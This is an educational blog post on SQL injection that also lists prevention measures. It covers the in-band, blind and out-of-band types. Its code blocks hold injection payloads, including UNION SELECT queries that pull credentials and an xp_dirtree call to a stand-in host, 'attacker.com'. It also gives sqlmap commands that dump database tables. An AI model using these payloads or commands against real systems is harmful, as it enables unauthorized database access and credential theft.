---
title: "SQL Injection Deep Dive: From Basics to Advanced Exploitation"
description: "A comprehensive guide to understanding and exploiting SQL injection vulnerabilities"
date: 2024-01-15
tags: ["web-security", "sql-injection", "pentesting", "owasp"]
categories: ["Security Research"]
image: "/images/blog/sql-injection.png"
---

SQL Injection remains one of the most critical web application vulnerabilities. In this post, we'll explore the various types of SQL injection attacks and how to exploit them effectively.

## What is SQL Injection?

SQL Injection (SQLi) is a code injection technique that exploits security vulnerabilities in an application's database layer. It occurs when user input is incorrectly filtered or not strongly typed.

## Types of SQL Injection

### 1. In-Band SQLi (Classic)

This is the most common and easy-to-exploit type of SQL injection attack. The attacker uses the same communication channel to launch the attack and gather results.

```sql
' OR '1'='1' --
' UNION SELECT username, password FROM users --
```

### 2. Blind SQLi

When an application is vulnerable to SQL injection but the results are not visible in the HTTP response. There are two sub-types:

**Boolean-based Blind SQLi:**
```sql
' AND 1=1 -- (returns normal page)
' AND 1=2 -- (returns different page)
```

**Time-based Blind SQLi:**
```sql
' AND SLEEP(5) --
' AND IF(1=1, SLEEP(5), 0) --
```

### 3. Out-of-Band SQLi

Used when the attacker cannot use the same channel for attack and results. Relies on features enabled on the database server.

```sql
'; EXEC xp_dirtree '\\attacker.com\share' --
```

## Exploitation Techniques

### Extracting Database Information

```sql
-- Get database version
' UNION SELECT @@version --

-- List all databases
' UNION SELECT schema_name FROM information_schema.schemata --

-- List tables in a database
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='target_db' --
```

### Advanced Exploitation with sqlmap

```bash
# Basic detection
sqlmap -u "http://target.com/page?id=1" --dbs

# Extract tables
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Dump data
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
```

## Prevention Measures

1. **Parameterized Queries**: Always use prepared statements
2. **Input Validation**: Validate and sanitize all user inputs
3. **Least Privilege**: Database accounts should have minimal permissions
4. **WAF**: Implement a Web Application Firewall as defense-in-depth

## Conclusion

Understanding SQL injection is crucial for any security professional. Practice these techniques in legal environments like CTF challenges and authorized penetration tests.

---

*Happy Hacking! Remember: Only test on systems you have permission to test.*
